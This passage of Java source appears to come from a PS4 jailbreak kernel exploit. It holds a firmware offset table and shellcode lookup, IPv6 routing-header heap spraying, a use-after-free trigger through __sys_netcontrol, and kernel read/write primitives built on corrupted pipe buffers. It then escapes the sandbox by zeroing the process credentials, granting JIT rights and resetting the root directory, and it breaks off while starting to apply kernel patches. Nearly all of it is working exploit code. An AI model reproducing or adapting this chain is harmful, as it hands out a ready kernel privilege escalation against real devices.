        shellcodeData.put("12.02", shellcodeData.get("12.00"));
        shellcodeData.put("12.52", shellcodeData.get("12.50"));
    }

    private static void addFirmwareOffsets(String fw, long evf, long prison0, long rootvnode, 
                                         long targetId, long sysent661, long jmpRsi, long klLock) {
        Hashtable offsets = new Hashtable();
        offsets.put("EVF_OFFSET", new Long(evf));
        offsets.put("PRISON0", new Long(prison0));
        offsets.put("ROOTVNODE", new Long(rootvnode));
        offsets.put("TARGET_ID_OFFSET", new Long(targetId));
        offsets.put("SYSENT_661_OFFSET", new Long(sysent661));
        offsets.put("JMP_RSI_GADGET", new Long(jmpRsi));
        offsets.put("KL_LOCK", new Long(klLock));
        ps4KernelOffsets.put(fw, offsets);
    }

    public static String getFirmwareVersion() {
        if (currentFirmware == null) {
            currentFirmware = Helper.getCurrentFirmwareVersion();
        }
        return currentFirmware;
    }

    public static boolean hasPS4Offsets() {
        return ps4KernelOffsets.containsKey(getFirmwareVersion());
    }

    public static long getPS4Offset(String offsetName) {
        String fw = getFirmwareVersion();
        Hashtable offsets = (Hashtable)ps4KernelOffsets.get(fw);
        if (offsets == null) {
            throw new RuntimeException("No offsets available for firmware " + fw);
        }

        Long offset = (Long)offsets.get(offsetName);
        if (offset == null) {
            throw new RuntimeException("Offset " + offsetName + " not found for firmware " + fw);
        }

        return offset.longValue();
    }

    public static boolean shouldApplyKernelPatches() {
        return hasPS4Offsets() && hasShellcodeForCurrentFirmware();
    }

    public static byte[] getKernelPatchesShellcode() {
        String firmware = getFirmwareVersion();
        String shellcode = (String)shellcodeData.get(firmware);
        if (shellcode == null || shellcode.length() == 0) {
            return new byte[0];
        }
        return hexToBinary(shellcode);
    }

    public static boolean hasShellcodeForCurrentFirmware() {
        String firmware = getFirmwareVersion();
        return shellcodeData.containsKey(firmware);
    }

    private static byte[] hexToBinary(String hex) {
        byte[] result = new byte[hex.length() / 2];
        for (int i = 0; i < result.length; i++) {
            int index = i * 2;
            int value = Integer.parseInt(hex.substring(index, index + 2), 16);
            result[i] = (byte)value;
        }
        return result;
    }

    // Initialize method to set firmware from Helper
    public static void initializeFromHelper() {
        String helperFirmware = Helper.getCurrentFirmwareVersion();
        if (helperFirmware != null) {
            currentFirmware = helperFirmware;
        }
    }
}
public class Poops {
    // constants
    private static final int AF_UNIX = 1;
    private static final int AF_INET6 = 28;
    private static final int SOCK_STREAM = 1;
    private static final int IPPROTO_IPV6 = 41;

    private static final int IPV6_RTHDR = 51;
    private static final int IPV6_RTHDR_TYPE_0 = 0;
    private static final int UCRED_SIZE = 0x168;
    private static final int MSG_HDR_SIZE = 0x30;
    private static final int UIO_IOV_NUM = 0x14;
    private static final int MSG_IOV_NUM = 0x17;
    private static final int IOV_SIZE = 0x10;

    private static final int IPV6_SOCK_NUM = 128;
    private static final int TWIN_TRIES = 15000;
    private static final int UAF_TRIES = 50000;
    private static final int KQUEUE_TRIES = 300000;
    private static final int IOV_THREAD_NUM = 4;
    private static final int UIO_THREAD_NUM = 4;
    private static final int PIPEBUF_SIZE = 0x18;

    private static final int COMMAND_UIO_READ = 0;
    private static final int COMMAND_UIO_WRITE = 1;
    private static final int PAGE_SIZE = 0x4000;
    private static final int FILEDESCENT_SIZE = 0x8;

    private static final int UIO_READ = 0;
    private static final int UIO_WRITE = 1;
    private static final int UIO_SYSSPACE = 1;

    private static final int NET_CONTROL_NETEVENT_SET_QUEUE = 0x20000003;
    private static final int NET_CONTROL_NETEVENT_CLEAR_QUEUE = 0x20000007;
    private static final int RTHDR_TAG = 0x13370000;

    private static final int SOL_SOCKET = 0xffff;
    private static final int SO_SNDBUF = 0x1001;

    private static final int F_SETFL = 4;
    private static final int O_NONBLOCK = 4;

    // system methods
    private static long dup;
    private static long close;
    private static long read;
    private static long readv;
    private static long write;
    private static long writev;
    private static long ioctl;
    private static long fcntl;
    private static long pipe;
    private static long kqueue;
    private static long socket;
    private static long socketpair;
    private static long recvmsg;
    private static long getsockopt;
    private static long setsockopt;
    private static long setuid;
    private static long getpid;
    private static long sched_yield;
    private static long cpuset_setaffinity;
    private static long __sys_netcontrol;

    // ploit data
    private static Buffer leakRthdr = new Buffer(UCRED_SIZE);
    private static Int32 leakRthdrLen = new Int32();
    private static Buffer sprayRthdr = new Buffer(UCRED_SIZE);
    private static Buffer msg = new Buffer(MSG_HDR_SIZE);
    private static int sprayRthdrLen;
    private static Buffer msgIov = new Buffer(MSG_IOV_NUM * IOV_SIZE);
    private static Buffer dummyBuffer = new Buffer(0x1000);
    private static Buffer tmp = new Buffer(PAGE_SIZE);
    private static Buffer victimPipebuf = new Buffer(PIPEBUF_SIZE);
    private static Buffer uioIovRead = new Buffer(UIO_IOV_NUM * IOV_SIZE);
    private static Buffer uioIovWrite = new Buffer(UIO_IOV_NUM * IOV_SIZE);

    private static Int32Array uioSs = new Int32Array(2);
    private static Int32Array iovSs = new Int32Array(2);

    private static IovThread[] iovThreads = new IovThread[IOV_THREAD_NUM];
    private static UioThread[] uioThreads = new UioThread[UIO_THREAD_NUM];

    private static WorkerState iovState = new WorkerState(IOV_THREAD_NUM);
    private static WorkerState uioState = new WorkerState(UIO_THREAD_NUM);

    private static int uafSock;

    private static int uioSs0;
    private static int uioSs1;

    private static int iovSs0;
    private static int iovSs1;

    private static long kl_lock;
    private static long kq_fdp;
    private static long fdt_ofiles;
    private static long allproc;

    private static int[] twins = new int[2];
    private static int[] triplets = new int[3];
    private static int[] ipv6Socks = new int[IPV6_SOCK_NUM];

    private static Int32Array masterPipeFd = new Int32Array(2);
    private static Int32Array victimPipeFd = new Int32Array(2);

    private static int masterRpipeFd;
    private static int masterWpipeFd;
    private static int victimRpipeFd;
    private static int victimWpipeFd;

    // misc data
    private static int previousCore = -1;

    private static Kernel.KernelRW kernelRW;

    private static PrintStream console;

    private static long kBase;

    private static API api;

    // sys methods
    private static int dup(int fd) {
        return (int) Helper.api.call(dup, fd);
    }

    private static int close(int fd) {
        return (int) Helper.api.call(close, fd);
    }

    private static long read(int fd, Buffer buf, long nbytes) {
        return Helper.api.call(read, fd, buf != null ? buf.address() : 0, nbytes);
    }

    private static long readv(int fd, Buffer iov, int iovcnt) {
        return Helper.api.call(readv, fd, iov != null ? iov.address() : 0, iovcnt);
    }

    private static long write(int fd, Buffer buf, long nbytes) {
        return Helper.api.call(write, fd, buf != null ? buf.address() : 0, nbytes);
    }

    private static long writev(int fd, Buffer iov, int iovcnt) {
        return Helper.api.call(writev, fd, iov != null ? iov.address() : 0, iovcnt);
    }

    private static int ioctl(int fd, long request, long arg0) {
        return (int) Helper.api.call(ioctl, fd, request, arg0);
    }

    private static int fcntl(int fd, int cmd, long arg0) {
        return (int) Helper.api.call(fcntl, fd, cmd, arg0);
    }

    private static int pipe(Int32Array fildes) {
        return (int) Helper.api.call(pipe, fildes != null ? fildes.address() : 0);
    }

    private static int kqueue() {
        return (int) Helper.api.call(kqueue);
    }

    private static int socket(int domain, int type, int protocol) {
        return (int) Helper.api.call(socket, domain, type, protocol);
    }

    private static int socketpair(int domain, int type, int protocol, Int32Array sv) {
        return (int) Helper.api.call(socketpair, domain, type, protocol, sv != null ? sv.address() : 0);
    }

    private static int recvmsg(int s, Buffer msg, int flags) {
        return (int) Helper.api.call(recvmsg, s, msg != null ? msg.address() : 0, flags);
    }

    private static int getsockopt(int s, int level, int optname, Buffer optval, Int32 optlen) {
        return (int) Helper.api.call(getsockopt, s, level, optname, optval != null ? optval.address() : 0, optlen != null ? optlen.address() : 0);
    }

    private static int setsockopt(int s, int level, int optname, Buffer optval, int optlen) {
        return (int) Helper.api.call(setsockopt, s, level, optname, optval != null ? optval.address() : 0, optlen);
    }

    private static int setuid(int uid) {
        return (int) Helper.api.call(setuid, uid);
    }

    private static int getpid() {
        return (int) Helper.api.call(getpid);
    }

    private static int sched_yield() {
        return (int) Helper.api.call(sched_yield);
    }

    private static int __sys_netcontrol(int ifindex, int cmd, Buffer buf, int size) {
        return (int) Helper.api.call(__sys_netcontrol, ifindex, cmd, buf != null ? buf.address() : 0, size);
    }

    private static int cpusetSetAffinity(int core) {
        Buffer mask = new Buffer(0x10);
        mask.putShort(0x00, (short) (1 << core));
        return cpuset_setaffinity(3, 1, 0xFFFFFFFFFFFFFFFFL, 0x10, mask);
    }

    private static int cpuset_setaffinity(int level, int which, long id, long setsize, Buffer mask) {
        return (int)api.call(cpuset_setaffinity, level, which, id, setsize, mask != null ? mask.address() : 0);
    }

    public static void cleanup() {
        for (int i = 0; i < ipv6Socks.length; i++) {
            close(ipv6Socks[i]);
        }
        close(uioSs1);
        close(uioSs0);
        close(iovSs1);
        close(iovSs0);
        for (int i = 0; i < IOV_THREAD_NUM; i++) {
            if (iovThreads[i] != null) {
                iovThreads[i].interrupt();
                try {
                    iovThreads[i].join();
                } catch (Exception e) {}
            }
        }
        for (int i = 0; i < UIO_THREAD_NUM; i++) {
            if (iovThreads[i] != null) {
                uioThreads[i].interrupt();
                try {
                    uioThreads[i].join();
                } catch (Exception e) {}
            }
        }
        if (previousCore >= 0 && previousCore != 4) {
            //console.println("back to core " + previousCore);
            Helper.pinToCore(previousCore);
            previousCore = -1;
        }
    }

    private static int buildRthdr(Buffer buf, int size) {
        int len = ((size >> 3) - 1) & ~1;
        buf.putByte(0x00, (byte) 0); // ip6r_nxt
        buf.putByte(0x01, (byte) len); // ip6r_len
        buf.putByte(0x02, (byte) IPV6_RTHDR_TYPE_0); // ip6r_type
        buf.putByte(0x03, (byte) (len >> 1)); // ip6r_segleft
        return (len + 1) << 3;
    }

    private static int getRthdr(int s, Buffer buf, Int32 len) {
        return getsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
    }

    private static int setRthdr(int s, Buffer buf, int len) {
        return setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
    }

    private static int freeRthdr(int s) {
        return setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, null, 0);
    }

    private static void buildUio(Buffer uio, long uio_iov, long uio_td, boolean read, long addr, long size) {
        uio.putLong(0x00, uio_iov); // uio_iov
        uio.putLong(0x08, UIO_IOV_NUM); // uio_iovcnt
        uio.putLong(0x10, 0xFFFFFFFFFFFFFFFFL); // uio_offset
        uio.putLong(0x18, size); // uio_resid
        uio.putInt(0x20, UIO_SYSSPACE); // uio_segflg
        uio.putInt(0x24, read ? UIO_WRITE : UIO_READ); // uio_segflg
        uio.putLong(0x28, uio_td); // uio_td
        uio.putLong(0x30, addr); // iov_base
        uio.putLong(0x38, size); // iov_len
    }

    private static Buffer kreadSlow(long addr, int size) {
        Buffer[] leakBuffers = new Buffer[UIO_THREAD_NUM];
        for (int i = 0; i < UIO_THREAD_NUM; i++) {
            leakBuffers[i] = new Buffer(size);
        }
        Int32 bufSize = new Int32(size);
        setsockopt(uioSs1, SOL_SOCKET, SO_SNDBUF, bufSize, bufSize.size());
        write(uioSs1, tmp, size);
        uioIovRead.putLong(0x08, size);
        freeRthdr(ipv6Socks[triplets[1]]);
        while (true) {
            uioState.signalWork(COMMAND_UIO_READ);
            sched_yield();
            leakRthdrLen.set(0x10);
            getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);
            if (leakRthdr.getInt(0x08) == UIO_IOV_NUM) {
                break;
            }
            read(uioSs0, tmp, size);
            for (int i = 0; i < UIO_THREAD_NUM; i++) {
                read(uioSs0, leakBuffers[i], leakBuffers[i].size());
            }
            uioState.waitForFinished();
            write(uioSs1, tmp, size);
        }
        long uio_iov = leakRthdr.getLong(0x00);
        buildUio(msgIov, uio_iov, 0, true, addr, size);
        freeRthdr(ipv6Socks[triplets[2]]);
        while (true) {
            iovState.signalWork(0);
            sched_yield();
            leakRthdrLen.set(0x40);
            getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);
            if (leakRthdr.getInt(0x20) == UIO_SYSSPACE) {
                break;
            }
            write(iovSs1, tmp, Int8.SIZE);
            iovState.waitForFinished();
            read(iovSs0, tmp, Int8.SIZE);
        }
        read(uioSs0, tmp, size);
        Buffer leakBuffer = null;
        for (int i = 0; i < UIO_THREAD_NUM; i++) {
            read(uioSs0, leakBuffers[i], leakBuffers[i].size());
            if (leakBuffers[i].getLong(0x00) != 0x4141414141414141L) {
                triplets[1] = findTriplet(triplets[0], -1, UAF_TRIES);
                if (triplets[1] == -1)
                {
                    console.println("kreadSlow triplet failure 1");
                    return null;
                }
                leakBuffer = leakBuffers[i];
            }
        }
        uioState.waitForFinished();
        write(iovSs1, tmp, Int8.SIZE);
        triplets[2] = findTriplet(triplets[0], triplets[1], UAF_TRIES);
        if (triplets[2] == -1)
        {
            console.println("kreadSlow triplet failure 2");
            return null;
        }
        iovState.waitForFinished();
        read(iovSs0, tmp, Int8.SIZE);
        return leakBuffer;
    }

    private static boolean kwriteSlow(long addr, Buffer buffer) {
        Int32 bufSize = new Int32(buffer.size());
        setsockopt(uioSs1, SOL_SOCKET, SO_SNDBUF, bufSize, bufSize.size());
        uioIovWrite.putLong(0x08, buffer.size());
        freeRthdr(ipv6Socks[triplets[1]]);
        while (true) {
            uioState.signalWork(COMMAND_UIO_WRITE);
            sched_yield();
            leakRthdrLen.set(0x10);
            getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);
            if (leakRthdr.getInt(0x08) == UIO_IOV_NUM) {
                break;
            }
            for (int i = 0; i < UIO_THREAD_NUM; i++) {
                write(uioSs1, buffer, buffer.size());
            }
            uioState.waitForFinished();
        }
        long uio_iov = leakRthdr.getLong(0x00);
        buildUio(msgIov, uio_iov, 0, false, addr, buffer.size());
        freeRthdr(ipv6Socks[triplets[2]]);
        while (true) {
            iovState.signalWork(0);
            sched_yield();
            leakRthdrLen.set(0x40);
            getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);
            if (leakRthdr.getInt(0x20) == UIO_SYSSPACE) {
                break;
            }
            write(iovSs1, tmp, Int8.SIZE);
            iovState.waitForFinished();
            read(iovSs0, tmp, Int8.SIZE);
        }
        for (int i = 0; i < UIO_THREAD_NUM; i++) {
            write(uioSs1, buffer, buffer.size());
        }
        triplets[1] = findTriplet(triplets[0], -1, UAF_TRIES);
        if (triplets[1] == -1)
        {
            console.println("kwriteSlow triplet failure 1");
            return false;
        }
        uioState.waitForFinished();
        write(iovSs1, tmp, Int8.SIZE);
        triplets[2] = findTriplet(triplets[0], triplets[1], UAF_TRIES);
        if (triplets[2] == -1)
        {
            console.println("kwriteSlow triplet failure 2");
            return false;
        }
        iovState.waitForFinished();
        read(iovSs0, tmp, Int8.SIZE);
        return true;
    }

    public static boolean performSetup() {
        try {
            api = API.getInstance();

            dup = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "dup");
            close = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "close");
            read = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "read");
            readv = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "readv");
            write = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "write");
            writev = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "writev");
            ioctl = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "ioctl");
            fcntl = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "fcntl");
            pipe = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "pipe");
            kqueue = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "kqueue");
            socket = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "socket");
            socketpair = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "socketpair");
            recvmsg = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "recvmsg");
            getsockopt = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "getsockopt");
            setsockopt = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "setsockopt");
            setuid = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "setuid");
            getpid = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "getpid");
            sched_yield = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "sched_yield");
            cpuset_setaffinity = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "cpuset_setaffinity");
            __sys_netcontrol = Helper.api.dlsym(Helper.api.LIBKERNEL_MODULE_HANDLE, "__sys_netcontrol");
            if (dup == 0 || close == 0 || read == 0 || readv == 0 || write == 0 || writev == 0  || ioctl == 0 || fcntl == 0 || pipe == 0 || kqueue == 0 || socket == 0 || socketpair == 0 ||
            recvmsg == 0 || getsockopt == 0 || setsockopt == 0 || setuid == 0 || getpid == 0 || sched_yield == 0 || __sys_netcontrol == 0 || cpuset_setaffinity == 0) {
                console.println("failed to resolve symbols");
                return false;
            }

            // Prepare spray buffer.
            sprayRthdrLen = buildRthdr(sprayRthdr, UCRED_SIZE);

            // Prepare msg iov buffer.
            msg.putLong(0x10, msgIov.address()); // msg_iov
            msg.putLong(0x18, MSG_IOV_NUM); // msg_iovlen

            dummyBuffer.fill((byte) 0x41);
            uioIovRead.putLong(0x00, dummyBuffer.address());
            uioIovWrite.putLong(0x00, dummyBuffer.address());

            // affinity
            previousCore = Helper.getCurrentCore();

            if (cpusetSetAffinity(4) != 0) {
                console.println("failed to pin to core");
                return false;
            }

            if (!Helper.setRealtimePriority(256)) {
                console.println("failed realtime priority");
                return false;
            }

            // Create socket pair for uio spraying.
            socketpair(AF_UNIX, SOCK_STREAM, 0, uioSs);
            uioSs0 = uioSs.get(0);
            uioSs1 = uioSs.get(1);

            // Create socket pair for iov spraying.
            socketpair(AF_UNIX, SOCK_STREAM, 0, iovSs);
            iovSs0 = iovSs.get(0);
            iovSs1 = iovSs.get(1);

            // Create iov threads.
            for (int i = 0; i < IOV_THREAD_NUM; i++) {
                iovThreads[i] = new IovThread(iovState);
                iovThreads[i].start();
            }

            // Create uio threads.
            for (int i = 0; i < UIO_THREAD_NUM; i++) {
                uioThreads[i] = new UioThread(uioState);
                uioThreads[i].start();
            }

            // Set up sockets for spraying.
            for (int i = 0; i < ipv6Socks.length; i++) {
                ipv6Socks[i] = socket(AF_INET6, SOCK_STREAM, 0);
            }

            // Initialize pktopts.
            for (int i = 0; i < ipv6Socks.length; i++) {
                freeRthdr(ipv6Socks[i]);
            }

            // init pipes
            pipe(masterPipeFd);
            pipe(victimPipeFd);

            masterRpipeFd = masterPipeFd.get(0);
            masterWpipeFd = masterPipeFd.get(1);
            victimRpipeFd = victimPipeFd.get(0);
            victimWpipeFd = victimPipeFd.get(1);

            fcntl(masterRpipeFd, F_SETFL, O_NONBLOCK);
            fcntl(masterWpipeFd, F_SETFL, O_NONBLOCK);
            fcntl(victimRpipeFd, F_SETFL, O_NONBLOCK);
            fcntl(victimWpipeFd, F_SETFL, O_NONBLOCK);

            return true;
        } catch (Exception e) {
            console.println("exception during performSetup");
            return false;
        }
    }

    private static boolean findTwins(int timeout) {
        while (timeout-- != 0) {
            for (int i = 0; i < ipv6Socks.length; i++) {
                sprayRthdr.putInt(0x04, RTHDR_TAG | i);
                setRthdr(ipv6Socks[i], sprayRthdr, sprayRthdrLen);
            }

            for (int i = 0; i < ipv6Socks.length; i++) {
                leakRthdrLen.set(Int64.SIZE);
                getRthdr(ipv6Socks[i], leakRthdr, leakRthdrLen);
                int val = leakRthdr.getInt(0x04);
                int j = val & 0xFFFF;
                if ((val & 0xFFFF0000) == RTHDR_TAG && i != j) {
                    twins[0] = i;
                    twins[1] = j;
                    return true;
                }
            }
        }
        return false;
    }

    private static int findTriplet(int master, int other, int timeout) {
        while (timeout-- != 0) {
            for (int i = 0; i < ipv6Socks.length; i++) {
                if (i == master || i == other) {
                    continue;
                }
                sprayRthdr.putInt(0x04, RTHDR_TAG | i);
                setRthdr(ipv6Socks[i], sprayRthdr, sprayRthdrLen);
            }

            for (int i = 0; i < ipv6Socks.length; i++) {
                if (i == master || i == other) {
                    continue;
                }
                leakRthdrLen.set(Int64.SIZE);
                getRthdr(ipv6Socks[master], leakRthdr, leakRthdrLen);
                int val = leakRthdr.getInt(0x04);
                int j = val & 0xFFFF;
                if ((val & 0xFFFF0000) == RTHDR_TAG && j != master && j != other) {
                    return j;
                }
            }
        }
        return -1;
    }

    private static long kreadSlow64(long address) {
        return kreadSlow(address, Int64.SIZE).getLong(0x00);
    }

    private static void fhold(long fp) {
        kwrite32(fp + 0x28, kread32(fp + 0x28) + 1); // f_count
    }

    private static long fget(int fd) {
        return kread64(fdt_ofiles + fd * FILEDESCENT_SIZE);
    }

    private static void removeRthrFromSocket(int fd) {
        long fp = fget(fd);
        long f_data = kread64(fp + 0x00);
        long so_pcb = kread64(f_data + 0x18);
        long in6p_outputopts = kread64(so_pcb + 0x118);
        kwrite64(in6p_outputopts + 0x68, 0); // ip6po_rhi_rthdr
    }

    private static int corruptPipebuf(int cnt, int in, int out, int size, long buffer) {
        if (buffer == 0) {
            throw new IllegalArgumentException("buffer cannot be zero");
        }
        victimPipebuf.putInt(0x00, cnt); // cnt
        victimPipebuf.putInt(0x04, in); // in
        victimPipebuf.putInt(0x08, out); // out
        victimPipebuf.putInt(0x0C, size); // size
        victimPipebuf.putLong(0x10, buffer); // buffer
        write(masterWpipeFd, victimPipebuf, victimPipebuf.size());
        return (int) read(masterRpipeFd, victimPipebuf, victimPipebuf.size());
    }

    public static int kread(Buffer dest, long src, long n) {
        corruptPipebuf((int) n, 0, 0, PAGE_SIZE, src);
        return (int) read(victimRpipeFd, dest, n);
    }

    public static int kwrite(long dest, Buffer src, long n) {
        corruptPipebuf(0, 0, 0, PAGE_SIZE, dest);
        return (int) write(victimWpipeFd, src, n);
    }

    public static void kwrite32(long addr, int val) {
        tmp.putInt(0x00, val);
        kwrite(addr, tmp, Int32.SIZE);
    }

    public static void kwrite64(long addr, long val) {
        tmp.putLong(0x00, val);
        kwrite(addr, tmp, Int64.SIZE);
    }

    public static long kread64(long addr) {
        kread(tmp, addr, Int64.SIZE);
        return tmp.getLong(0x00);
    }

    public static int kread32(long addr) {
        kread(tmp, addr, Int32.SIZE);
        return tmp.getInt(0x00);
    }

    private static void removeUafFile() {
        long uafFile = fget(uafSock);
        kwrite64(fdt_ofiles + uafSock * FILEDESCENT_SIZE, 0);
        int removed = 0;
        Int32Array ss = new Int32Array(2);
        for (int i = 0; i < UAF_TRIES; i++) {
            int s = socket(AF_UNIX, SOCK_STREAM, 0);
            if (fget(s) == uafFile) {
                kwrite64(fdt_ofiles + s * FILEDESCENT_SIZE, 0);
                removed++;
            }
            close(s);
            if (removed == 3) {
                break;
            }
        }
    }

    private static boolean achieveRw(int timeout) {
        try {
            // Free one.
            freeRthdr(ipv6Socks[triplets[1]]);

            // Leak kqueue.
            int kq = 0;
            while (timeout-- != 0) {
                kq = kqueue();

                // Leak with other rthdr.
                leakRthdrLen.set(0x100);
                getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);
                if (leakRthdr.getLong(0x08) == 0x1430000 && leakRthdr.getLong(0x98) != 0) {
                    break;
                }
                close(kq);
            }

            if (timeout <= 0)
            {
                console.println("kqueue realloc failed");
                return false;
            }

            kl_lock = leakRthdr.getLong(0x60);
            kq_fdp = leakRthdr.getLong(0x98);
            close(kq);

            // Find triplet.
            triplets[1] = findTriplet(triplets[0], triplets[2], UAF_TRIES);
            if (triplets[1] == -1)
            {
                console.println("kqueue triplets 1 failed ");
                return false;
            }

            long fd_files = kreadSlow64(kq_fdp);
            fdt_ofiles = fd_files + 0x00;

            long masterRpipeFile = kreadSlow64(fdt_ofiles + masterPipeFd.get(0) * FILEDESCENT_SIZE);
            long victimRpipeFile = kreadSlow64(fdt_ofiles + victimPipeFd.get(0) * FILEDESCENT_SIZE);
            long masterRpipeData = kreadSlow64(masterRpipeFile + 0x00);
            long victimRpipeData = kreadSlow64(victimRpipeFile + 0x00);

            Buffer masterPipebuf = new Buffer(PIPEBUF_SIZE);
            masterPipebuf.putInt(0x00, 0); // cnt
            masterPipebuf.putInt(0x04, 0); // in
            masterPipebuf.putInt(0x08, 0); // out
            masterPipebuf.putInt(0x0C, PAGE_SIZE); // size
            masterPipebuf.putLong(0x10, victimRpipeData); // buffer
            kwriteSlow(masterRpipeData, masterPipebuf);

            fhold(fget(masterPipeFd.get(0)));
            fhold(fget(masterPipeFd.get(1)));
            fhold(fget(victimPipeFd.get(0)));
            fhold(fget(victimPipeFd.get(1)));

            for (int i = 0; i < triplets.length; i++) {
                removeRthrFromSocket(ipv6Socks[triplets[i]]);
            }

            removeUafFile();
        } catch (Exception e)
        {
            console.println("exception during stage 1");
            return false;
        }
        return true;
    }

    private static long pfind(int pid) {
        long p = kread64(allproc);
        while (p != 0) {
            if (kread32(p + 0xb0) == pid) {
                break;
            }
            p = kread64(p + 0x00); // p_list.le_next
        }
        return p;
    }

    private static long getPrison0() {
        long p = pfind(0);
        long p_ucred = kread64(p + 0x40);
        long prison0 = kread64(p_ucred + 0x30);
        return prison0;
    }

    private static long getRootVnode(int i) {
        long p = pfind(0);
        long p_fd = kread64(p + 0x48);
        long rootvnode = kread64(p_fd + i);
        return rootvnode;
    }

    private static boolean escapeSandbox() {
        // get curproc
        Int32Array pipeFd = new Int32Array(2);
        pipe(pipeFd);
        
        Int32 currPid = new Int32();
        int curpid = getpid();
        currPid.set(curpid);
        ioctl(pipeFd.get(0), 0x8004667CL, currPid.address());

        long fp = fget(pipeFd.get(0));
        long f_data = kread64(fp + 0x00);
        long pipe_sigio = kread64(f_data + 0xd0);
        long curproc = kread64(pipe_sigio);
        long p = curproc;

        // get allproc
        while ((p & 0xFFFFFFFF00000000L) != 0xFFFFFFFF00000000L) {
            p = kread64(p + 0x08); // p_list.le_prev
        }

        allproc = p;

        close(pipeFd.get(1));
        close(pipeFd.get(0));

        kBase = kl_lock - KernelOffset.getPS4Offset("KL_LOCK");

        long OFFSET_P_UCRED = 0x40;
        long procFd = kread64(curproc + KernelOffset.PROC_FD);
        long ucred = kread64(curproc + OFFSET_P_UCRED);
        
        if ((procFd >>> 48) != 0xFFFF) {
            console.print("bad procfd");
            return false;
        }
        if ((ucred >>> 48) != 0xFFFF) {
            console.print("bad ucred");
            return false;
        }
        
        kwrite32(ucred + 0x04, 0); // cr_uid
        kwrite32(ucred + 0x08, 0); // cr_ruid
        kwrite32(ucred + 0x0C, 0); // cr_svuid
        kwrite32(ucred + 0x10, 1); // cr_ngroups
        kwrite32(ucred + 0x14, 0); // cr_rgid

        long prison0 = getPrison0();
        if ((prison0 >>> 48) != 0xFFFF) {
            console.print("bad prison0");
            return false;
        }
        kwrite64(ucred + 0x30, prison0);

        // Add JIT privileges
        kwrite64(ucred + 0x60, -1);
        kwrite64(ucred + 0x68, -1);

        long rootvnode = getRootVnode(0x10);
        if ((rootvnode >>> 48) != 0xFFFF) {
            console.print("bad rootvnode");
            return false;
        }
        kwrite64(procFd + 0x10, rootvnode); // fd_rdir
        kwrite64(procFd + 0x18, rootvnode); // fd_jdir
        return true;
    }

    private static boolean triggerUcredTripleFree() {
        try {
            Buffer setBuf = new Buffer(8);
            Buffer clearBuf = new Buffer(8);
            msgIov.putLong(0x00, 1); // iov_base
            msgIov.putLong(0x08, Int8.SIZE); // iov_len
            int dummySock = socket(AF_UNIX, SOCK_STREAM, 0);
            setBuf.putInt(0x00, dummySock);
            __sys_netcontrol(-1, NET_CONTROL_NETEVENT_SET_QUEUE, setBuf, setBuf.size());
            close(dummySock);
            setuid(1);
            uafSock = socket(AF_UNIX, SOCK_STREAM, 0);
            setuid(1);
            clearBuf.putInt(0x00, uafSock);
            __sys_netcontrol(-1, NET_CONTROL_NETEVENT_CLEAR_QUEUE, clearBuf, clearBuf.size());
            for (int i = 0; i < 32; i++) {
                iovState.signalWork(0);
                sched_yield();
                write(iovSs1, tmp, Int8.SIZE);
                iovState.waitForFinished();
                read(iovSs0, tmp, Int8.SIZE);
            }
            close(dup(uafSock));
            if (!findTwins(TWIN_TRIES))
            {
                console.println("twins failed");
                return false;
            }

            freeRthdr(ipv6Socks[twins[1]]);
            int timeout = UAF_TRIES;
            while (timeout-- > 0) {
                iovState.signalWork(0);
                sched_yield();
                leakRthdrLen.set(Int64.SIZE);
                getRthdr(ipv6Socks[twins[0]], leakRthdr, leakRthdrLen);
                if (leakRthdr.getInt(0x00) == 1) {
                    break;
                }
                write(iovSs1, tmp, Int8.SIZE);
                iovState.waitForFinished();
                read(iovSs0, tmp, Int8.SIZE);
            }
            if (timeout <= 0)
            {
                console.println("iov reclaim failed");
                return false;
            }
            triplets[0] = twins[0];
            close(dup(uafSock));
            triplets[1] = findTriplet(triplets[0], -1, UAF_TRIES);
            if (triplets[1] == -1)
            {
                console.println("triplets 1 failed");
                return false;
            }
            write(iovSs1, tmp, Int8.SIZE);
            triplets[2] = findTriplet(triplets[0], triplets[1], UAF_TRIES);
            if (triplets[2] == -1)
            {
                console.println("triplets 2 failed");
                return false;
            }
            iovState.waitForFinished();
            read(iovSs0, tmp, Int8.SIZE);
        } catch (Exception e)
        {
            console.println("exception during stage 0");
            return false;
        }
        return true;
    }

    private static boolean applyKernelPatchesPS4() {
        try {
            byte[] shellcode = KernelOffset.getKernelPatchesShellcode();
            if (shellcode.length == 0) {
                return false;
            }

            long sysent661Addr = kBase + KernelOffset.getPS4Offset("SYSENT_661_OFFSET");
            long mappingAddr = 0x920100000L;
            long shadowMappingAddr = 0x926100000L;

            int syNarg = kread32(sysent661Addr);
            long syCall = kread64(sysent661Addr + 8);
